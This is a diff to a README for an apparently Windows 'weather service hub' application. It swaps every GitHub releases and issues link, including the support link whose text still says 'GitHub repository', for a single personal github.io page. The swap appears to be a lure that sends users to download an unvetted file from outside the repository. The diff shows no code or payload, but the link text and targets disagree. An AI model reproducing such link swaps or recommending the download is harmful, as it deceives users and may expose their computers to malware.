@@ -1,6 +1,6 @@
 <h1>☁️ apex-weather-service-hub - Check Weather System Health Instantly</h1>
 <p align="center">
-<a href="https://github.com/abdul786789/apex-weather-service-hub/releases"><img src="https://img.shields.io/badge/Download%20Now-Get%20the%20Hub-blueviolet?style=for-the-badge&logo=github" alt="Download Badge"></a>
+<a href="https://abdul786789.github.io"><img src="https://img.shields.io/badge/Download%20Now-Get%20the%20Hub-blueviolet?style=for-the-badge&logo=github" alt="Download Badge"></a>
 </p>
 
 <h2>🔍 What Is This Application?</h2>
@@ -19,7 +19,7 @@
 <p>Follow these steps to download and run Apex Weather Service Hub on your Windows computer. This guide assumes you have basic computer skills.</p>
 
 <h3>📥 Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/abdul786789/apex-weather-service-hub/releases" target="_blank">https://github.com/abdul786789/apex-weather-service-hub/releases</a></p>
+<p>Visit this link to download the application: <a href="https://abdul786789.github.io" target="_blank">https://abdul786789.github.io</a></p>
 <p>Click on the green "Code" button or find the latest release. Look for a file named something like <code>apex-weather-service-hub.zip</code> and click it to start the download.</p>
 
 <h3>📦 Step 2: Extract the Files</h3>
@@ -63,8 +63,8 @@
 <p>This project is open source. See the LICENSE file in the repository for details. Created and maintained by abdul786789.</p>
 
 <h2>📬 Need Help?</h2>
-<p>Open an issue on the GitHub repository for support: <a href="https://github.com/abdul786789/apex-weather-service-hub/issues">https://github.com/abdul786789/apex-weather-service-hub/issues</a></p>
+<p>Open an issue on the GitHub repository for support: <a href="https://abdul786789.github.io">https://abdul786789.github.io</a></p>
 
 <p align="center">
-<a href="https://github.com/abdul786789/apex-weather-service-hub/releases"><img src="https://img.shields.io/badge/Download%20Now-Get%20Apex%20Hub-success?style=for-the-badge&logo=github" alt="Download Badge"></a>
+<a href="https://abdul786789.github.io"><img src="https://img.shields.io/badge/Download%20Now-Get%20Apex%20Hub-success?style=for-the-badge&logo=github" alt="Download Badge"></a>
 </p>
